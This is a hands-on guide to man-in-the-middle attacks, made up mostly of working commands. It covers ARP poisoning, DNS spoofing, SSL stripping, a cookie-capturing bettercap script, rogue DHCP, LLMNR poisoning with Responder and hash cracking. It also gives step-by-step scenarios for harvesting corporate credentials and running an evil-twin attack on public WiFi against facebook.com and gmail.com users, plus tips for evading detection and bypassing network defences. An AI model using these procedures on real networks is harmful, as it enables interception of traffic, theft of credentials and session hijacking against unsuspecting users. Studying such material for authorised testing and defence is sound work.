# Man-in-the-Middle (MITM) Attacks - Complete Guide

## What is a MITM Attack?

A Man-in-the-Middle attack occurs when an attacker intercepts communication between two parties, allowing them to eavesdrop, modify, or inject data into the communication stream.

## When to Perform MITM Attacks

- **Traffic Analysis**: Understanding unencrypted protocols
- **Credential Harvesting**: Capturing login credentials
- **Session Hijacking**: Stealing active sessions
- **SSL/TLS Stripping**: Downgrading HTTPS to HTTP
- **Packet Injection**: Modifying data in transit
- **Protocol Analysis**: Understanding custom protocols

## Tool Selection Guide

### Ettercap vs Bettercap vs Arpspoof

| Feature | Ettercap | Bettercap | Arpspoof |
|---------|----------|-----------|----------|
| **Ease of Use** | Medium (GUI) | Easy (Interactive) | Hard (Manual) |
| **Flexibility** | Medium | High | Low |
| **Plugins** | Built-in | Modules | None |
| **Scripting** | Filters | REST API | Manual scripting |
| **Best For** | Quick MITM | Modern attacks | Scripting/Automation |

### When to Use Each Tool

**Use Ettercap When**:
- You want a GUI interface
- Need quick ARP poisoning
- Want built-in plugins (DNS spoofing, etc.)
- Analyzing protocols visually

**Use Bettercap When**:
- Modern, active development needed
- REST API integration required
- Advanced HTTP/HTTPS manipulation
- Network monitoring and reconnaissance
- Scriptable attacks

**Use Arpspoof When**:
- Simple ARP poisoning only
- Integrating with custom scripts
- Lightweight solution needed
- Part of larger attack chain

## MITM Attack Types

### 1. ARP Poisoning/Spoofing

**How It Works**:
1. Attacker sends fake ARP replies
2. Victim's ARP cache maps gateway IP to attacker's MAC
3. Gateway's ARP cache maps victim IP to attacker's MAC
4. All traffic flows through attacker

**Setup Requirements**:
```bash
# Enable IP forwarding (CRITICAL - prevents DoS)
echo 1 > /proc/sys/net/ipv4/ip_forward
sysctl -w net.ipv4.ip_forward=1
```

**Attack Flow**:
```bash
# Method 1: Using Bettercap (Recommended)
sudo bettercap -iface eth0

# In Bettercap console:
net.probe on                                  # Discover hosts
set arp.spoof.targets 192.168.1.100          # Set target
set arp.spoof.fullduplex true                # Bidirectional
arp.spoof on                                 # Start attack
net.sniff on                                 # Capture traffic

# Method 2: Using Ettercap
ettercap -T -i eth0 -M arp:remote /192.168.1.100/ /192.168.1.1/

# Method 3: Using Arpspoof (Manual)
arpspoof -i eth0 -t 192.168.1.100 192.168.1.1  # Terminal 1
arpspoof -i eth0 -t 192.168.1.1 192.168.1.100  # Terminal 2
```

**When to Use**:
- Local network access available
- Layer 2 access required
- Unencrypted traffic expected
- Quick credential harvesting

**Bypass Techniques**:
- **Static ARP Entries**: Can't bypass (defense wins)
- **ARP Inspection**: Use MAC cloning if possible
- **Port Security**: Must compromise switch or find unused port

### 2. DNS Spoofing

**How It Works**:
1. Intercept DNS queries via MITM
2. Respond with fake IP address
3. Victim connects to attacker-controlled server

**Implementation**:
```bash
# Using Bettercap
set dns.spoof.domains target.com,*.target.com
set dns.spoof.address 192.168.1.50
dns.spoof on

# Using Ettercap
# Edit /etc/ettercap/etter.dns:
# target.com A 192.168.1.50
# *.target.com A 192.168.1.50
ettercap -T -i eth0 -P dns_spoof -M arp /// ///

# Using dnsspoof (dsniff)
dnsspoof -i eth0 -f hosts.txt
```

**When to Use**:
- Redirect traffic to phishing site
- Intercept specific domain traffic
- Perform SSL stripping on HTTPS sites
- Bypass domain-based restrictions

**Bypass DNS Security**:
- **DNSSEC**: Can't spoof if validated (move to HTTPS stripping)
- **DoH/DoT**: Intercept at application layer or block ports 853, 443
- **Hardcoded IPs**: DNS spoofing won't work, use other MITM

### 3. SSL/TLS Stripping

**How It Works**:
1. Intercept HTTPS request from victim
2. Establish HTTPS connection to real server
3. Present HTTP to victim (downgrade)
4. User sees HTTP, attacker sees plaintext

**SSLStrip Attack**:
```bash
# Classic SSLStrip (Legacy)
sslstrip -l 8080 -w sslstrip.log
iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080
iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-port 8080

# Modern Bettercap Method
set http.proxy.sslstrip true
set http.proxy.port 8080
http.proxy on
# Combined with ARP spoofing
arp.spoof on
```

**When to Use**:
- Target uses HTTP → HTTPS redirects
- No HSTS (HTTP Strict Transport Security)
- User doesn't notice missing lock icon
- Intercepting credentials/sensitive data

**Bypass SSL/TLS Security**:
- **HSTS**: Can't bypass if preloaded (attack fails)
  - Workaround: Homograph/typosquatting domains
- **Certificate Pinning**: Can't bypass (attack fails)
- **HTTPS Everywhere**: Users might notice, social engineering needed
- **Browser Warnings**: User education defeats this

### 4. Session Hijacking

**How It Works**:
1. Capture session cookies/tokens via MITM
2. Replay cookies in attacker's browser
3. Impersonate victim's session

**Cookie Capture**:
```bash
# Using Wireshark/tshark
tshark -i eth0 -Y "http.cookie" -T fields -e http.cookie -e http.host

# Using tcpdump
tcpdump -i eth0 -A 'tcp port 80' | grep -i cookie

# Using Bettercap
set http.proxy.script /path/to/cookie_stealer.js
http.proxy on
```

**Bettercap JavaScript Example**:
```javascript
// cookie_stealer.js
function onResponse(req, res) {
    if (res.Headers.get("Set-Cookie")) {
        console.log("Cookie from " + req.Hostname + ": " + res.Headers.get("Set-Cookie"));
    }
}
```

**When to Use**:
- HTTP-only sessions (no HTTPS)
- Session tokens in URLs
- Long-lived sessions
- No session binding (IP/UA checks)

**Bypass Session Security**:
- **HTTPOnly Cookies**: Still capturable in transit, can't be read by JS
- **Secure Flag**: Won't be sent over HTTP (use SSL strip or HTTPS MITM)
- **Session Binding**: Need to spoof IP/User-Agent
- **Short Timeouts**: Attack quickly after capture

## Advanced MITM Techniques

### IPv6 MITM

**Why IPv6**:
- Often less monitored
- Different security controls
- Dual-stack environments vulnerable

**Attack**:
```bash
# Fake IPv6 router
atk6-fake_router6 eth0 fe80::1 2001:db8::/64

# IPv6 MITM
atk6-parasite6 eth0 fe80::victim
```

**When to Use**:
- IPv6 enabled networks
- Bypassing IPv4 controls
- Testing dual-stack security

### DHCP MITM

**How It Works**:
1. Faster DHCP server response than legitimate
2. Provide attacker's IP as gateway/DNS
3. All traffic flows through attacker

**Rogue DHCP**:
```bash
# Using dnsmasq
dnsmasq --interface=eth0 \
        --dhcp-range=192.168.1.50,192.168.1.150,12h \
        --dhcp-option=3,192.168.1.50 \
        --dhcp-option=6,192.168.1.50
```

**When to Use**:
- New hosts joining network
- DHCP starvation first
- No DHCP snooping
- Physical access available

### LLMNR/NBT-NS Poisoning

**How It Works** (Windows Networks):
1. Windows host tries to resolve name
2. DNS fails, fallback to LLMNR/NBT-NS
3. Attacker responds first
4. Victim connects to attacker, sends credentials

**Responder Attack**:
```bash
# Start Responder
responder -I eth0 -wrf

# Wait for authentication attempts
# Captured hashes saved to /usr/share/responder/logs/
```

**Crack Captured Hashes**:
```bash
# NTLMv2 hashes
hashcat -m 5600 hashes.txt wordlist.txt

# NTLM hashes
john --format=netntlmv2 hashes.txt
```

**When to Use**:
- Windows enterprise networks
- Active Directory environments
- Name resolution failures common
- Passive credential harvesting

**Bypass LLMNR/NBT-NS Security**:
- **Disabled LLMNR**: Can't bypass (attack fails)
- **SMB Signing**: Still get hash, but can't relay
- **Network Segmentation**: Limited attack scope

## Detection Evasion

### Avoiding ARP Spoofing Detection

**Problem**: ARP monitoring tools detect duplicate IPs/MACs

**Solutions**:
1. **MAC Cloning**: Use victim's MAC when spoofing
```bash
macchanger -m 00:11:22:33:44:55 eth0
```

2. **Selective Targeting**: Target only specific hosts
```bash
set arp.spoof.targets 192.168.1.100,192.168.1.101
```

3. **Rate Limiting**: Slow ARP packet rate
```bash
# Reduce packet frequency
set arp.spoof.interval 10  # 10 seconds between packets
```

4. **Gratuitous ARP Timing**: Match legitimate timing

### Avoiding IDS/IPS Detection

**Techniques**:
1. **Encrypted Tunnels**: Tunnel through SSL/TLS
2. **Fragmentation**: Fragment malicious packets
3. **Protocol Compliance**: Use valid protocol behavior
4. **Timing Manipulation**: Avoid pattern detection

## Traffic Capture and Analysis

### What to Capture

**High-Value Protocols**:
```bash
# Credentials protocols (cleartext)
tcpdump -i eth0 'port 21 or port 23 or port 110 or port 143'  # FTP, Telnet, POP3, IMAP

# Web traffic
tcpdump -i eth0 'port 80 or port 8080'                        # HTTP

# Authentication
tcpdump -i eth0 'port 445 or port 139'                        # SMB
```

**Wireshark Filters for MITM**:
```
http.request.method == "POST"                 # POST requests (often credentials)
http.cookie                                   # HTTP cookies
ftp.request.command == "PASS"                 # FTP passwords
smtp.auth.password                            # SMTP auth
telnet.data contains "password"               # Telnet passwords
```

### Extracting Credentials

**From PCAP Files**:
```bash
# Using NetworkMiner
networkminer capture.pcap
# Check Credentials tab

# Using Wireshark
wireshark capture.pcap
# File → Export Objects → HTTP
# Look for login forms

# Using tshark
tshark -r capture.pcap -Y "http.request.method==POST" -T fields -e http.file_data
```

## Practical Attack Scenarios

### Scenario 1: Corporate Network Credential Harvest

**Objective**: Capture employee credentials on corporate LAN

**Steps**:
```bash
# 1. Enable IP forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# 2. Start Responder (passive credential harvest)
responder -I eth0 -A  # Analyze mode first

# 3. Start ARP spoofing (target gateway and specific hosts)
bettercap -iface eth0
# net.probe on
# set arp.spoof.targets 192.168.1.100-110
# arp.spoof on

# 4. Start traffic sniffing
tcpdump -i eth0 -w corporate_capture.pcap 'port 80 or port 445'

# 5. Wait for authentication events
# Monitor responder logs: tail -f /usr/share/responder/logs/*

# 6. Crack captured hashes
hashcat -m 5600 captured_hashes.txt rockyou.txt
```

### Scenario 2: Public WiFi Attack

**Objective**: Intercept traffic on public WiFi

**Steps**:
```bash
# 1. Fake access point (Evil Twin)
airbase-ng -e "FreeWiFi" -c 6 wlan0mon

# 2. DHCP server
dnsmasq --interface=at0 --dhcp-range=10.0.0.10,10.0.0.100,12h

# 3. DNS spoofing for common sites
set dns.spoof.domains facebook.com,gmail.com,*.google.com
set dns.spoof.address 10.0.0.1
dns.spoof on

# 4. SSL stripping
set http.proxy.sslstrip true
http.proxy on

# 5. Capture traffic
tcpdump -i at0 -w public_wifi.pcap
```

### Scenario 3: IoT Device Intercept

**Objective**: Intercept smart device communication

**Steps**:
```bash
# 1. Identify IoT device
nmap -sn 192.168.1.0/24
# Find device by MAC vendor

# 2. Target specific device
set arp.spoof.targets 192.168.1.50  # IoT device
arp.spoof on

# 3. Monitor all protocols
tcpdump -i eth0 -w iot_traffic.pcap 'host 192.168.1.50'

# 4. Analyze captured traffic
wireshark iot_traffic.pcap
# Look for API endpoints, unencrypted data, auth tokens
```

## Common Mistakes and Fixes

### Mistake 1: Forgetting IP Forwarding
**Problem**: Traffic stops, causes DoS
**Fix**:
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
# Verify: cat /proc/sys/net/ipv4/ip_forward
```

### Mistake 2: Wrong Network Interface
**Problem**: Attack doesn't work
**Fix**:
```bash
# List interfaces
ip a
ifconfig
# Use correct interface name in tools
```

### Mistake 3: Firewall Blocking
**Problem**: iptables blocks forwarded traffic
**Fix**:
```bash
# Allow forwarding
iptables -P FORWARD ACCEPT
# Or flush rules
iptables -F
```

### Mistake 4: Not Cleaning Up
**Problem**: Network disruption persists
**Fix**:
```bash
# Stop all MITM tools
killall bettercap ettercap arpspoof

# Disable IP forwarding
echo 0 > /proc/sys/net/ipv4/ip_forward

# Send correct ARP
arpspoof -i eth0 -t 192.168.1.100 -r 192.168.1.1  # Restore
```

## Defense Bypass Strategies

### Bypassing ARP Inspection
- **Not Bypassable**: Must use different MITM method (DNS, DHCP, etc.)

### Bypassing Port Security
- **MAC Spoofing**: Clone authorized MAC
- **Find Unused Ports**: Use ports without security

### Bypassing 802.1X
- **MAC Bypass**: Clone authenticated device MAC
- **Hub Attack**: Insert hub between device and switch

### Bypassing Network Segmentation
- **Compromised Host**: Pivot through allowed hosts
- **VLAN Hopping**: Double tagging or DTP attacks

## Tools Comparison

**Best Tool for Each Scenario**:

- **Quick ARP MITM**: Bettercap (easiest, most features)
- **Windows Credential Harvest**: Responder
- **Custom Packet Modification**: Ettercap filters or Scapy
- **SSL/TLS Interception**: MITMproxy or Burp Suite
- **Simple Automation**: Arpspoof + custom scripts
- **Traffic Analysis**: Wireshark

## Best Practices

1. **Always enable IP forwarding** before MITM
2. **Test in isolated environment** first
3. **Have cleanup plan** ready
4. **Monitor your own traffic** for issues
5. **Document target MAC/IP** before attack
6. **Use VPN/proxy** if doing remotely
7. **Capture to file** for offline analysis
8. **Be ready to stop immediately** if detected

## Further Learning

- **Bettercap Wiki**: https://www.bettercap.org/
- **Ettercap Man Page**: https://www.ettercap-project.org/
- **Wireshark University**: https://www.wireshark.org/docs/
- **MITM Attack Fundamentals**: Research ARP, DNS, DHCP protocols
